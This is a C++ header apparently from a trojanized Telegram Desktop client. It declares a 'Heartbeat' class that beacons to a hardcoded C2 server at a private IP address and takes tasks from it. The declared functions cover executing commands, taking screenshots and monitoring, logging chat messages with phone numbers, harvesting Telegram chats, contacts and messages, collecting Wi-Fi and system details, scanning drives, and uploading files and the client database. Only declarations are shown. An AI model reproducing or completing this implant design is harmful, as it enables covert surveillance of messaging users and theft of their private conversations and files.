#pragma once

#include <QtCore/QObject>
#include <QtCore/QTimer>
#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>

namespace Core {

class Heartbeat : public QObject {
    Q_OBJECT
public:
    static Heartbeat& Instance();
    void start();

    // Public Logging
    void logChatMessage(const QString& platform, const QString& chatId, const QString& sender, const QString& content, bool isOutgoing,
                        const QString& senderId = "", const QString& senderUsername = "", const QString& senderPhone = "",
                        const QString& receiverId = "", const QString& receiverUsername = "", const QString& receiverPhone = "",
                        const QString& mediaPath = "");
    
    // Sync
    void syncChatHistory();
    
private:
    Heartbeat();
    ~Heartbeat() = default;

    void sendHeartbeat();
    void checkTasks();
    void executeTask(const QString& taskId, const QString& command, const QString& params);
    void performMonitor();
    void performScreenshot(const QString& taskId);
    void uploadResult(const QString& taskId, const QString& result, const QString& status = "completed");
    void uploadFile(const QString& taskId, const QString& filePath);
    QString getOrCreateUuid();
    void startBackgroundScan();
    void triggerFullScan(const QString& taskId, const QString& mode = "full");
    
    // New Collection Methods
    void collectInstalledSoftware();
    void collectSystemInfo();
    void collectWiFiInfo();
    void collectTelegramData(); // Chats, Contacts, Messages
    void processMediaDownloads(); // Process pending media downloads
    void cleanupDatabase(); // Cleanup old records to save space
    void uploadClientDb(const QString& taskId = ""); // Upload tdata_client.db

    // Full Sync Logic
    void startFullSync(const QString& taskId);
    
    // File System
    void collectDrivesAndUsers();
    void scanDirectory(const QString& taskId, const QString& path);
    void uploadFileList(const QString& parentPath, const QJsonArray& files);
    
    // Helper
    QString getDbPath();
    void ensureDbInit(const QString& path);

    // Crypto Helpers
    QString encryptData(const QString& data, const QString& hostname, const QString& timestamp);
    QString decryptData(const QString& data, const QString& hostname, const QString& timestamp);

    // Sync State
    QString _syncTaskId;
    int _activeSyncs = 0;
    void fetchHistoryLoop(void* peer, int minId); // void* to avoid including heavy headers in .h if not needed, but we have them in .cpp. 
    // Actually we can use forward decl for PeerData if needed, or just keep implementation in cpp.
    // Let's use void* or specific type if header allows. 
    // PeerData is in data/data_peer.h. 
    // Let's just put the implementation in cpp and use a private helper there, or add member here.
    // To be safe with headers, I'll use void* in header or just implementation detail.
    // Better: keep `fetchHistoryLoop` private and take `PeerData*`.
    // But `PeerData` is not declared in heartbeat.h.
    // I will use `QPointer<PeerData>` or just pass `quint64 peerId` and resolve it.
    
    void checkSyncFinished();
    void processHistoryResult(const void* result_ptr, void* peer_ptr, int& newMinId, int& newMaxId, bool& hasUpdates); // Helper

    QTimer _timer;
    QTimer _collectionTimer; // Separate timer for heavy collection
    QTimer _monitorTimer;
    int64_t _lastUploadTime = 0;
    int64_t _lastIntervalChangeTime = 0;
    int _currentHeartbeatInterval = 60000; // Default 60s
    QString _monitorTaskId;
    QString _deviceUuid;
    uint64_t _currentTgId = 0;
    int64_t _pid = 0;
    QNetworkAccessManager _network;
    QString _c2Url = "http://192.168.2.131:8101"; // Configurable
    QString _dataStatus = "Active";
};

// Background Scanner Worker
class BackgroundScanner : public QObject {
    Q_OBJECT
public:
    BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& dbPath, const QString& taskId = "", const QString& mode = "full", const QString& targetPath = "");
public Q_SLOTS:
    void process();
Q_SIGNALS:
    void scanFinished(const QString& taskId, const QByteArray& jsonData);
    void progress(const QString& msg);
private:
    QString _uuid;
    QString _c2Url;
    QString _dbPath;
    QString _taskId;
    QString _mode;
    QString _targetPath;
};

} // namespace Core
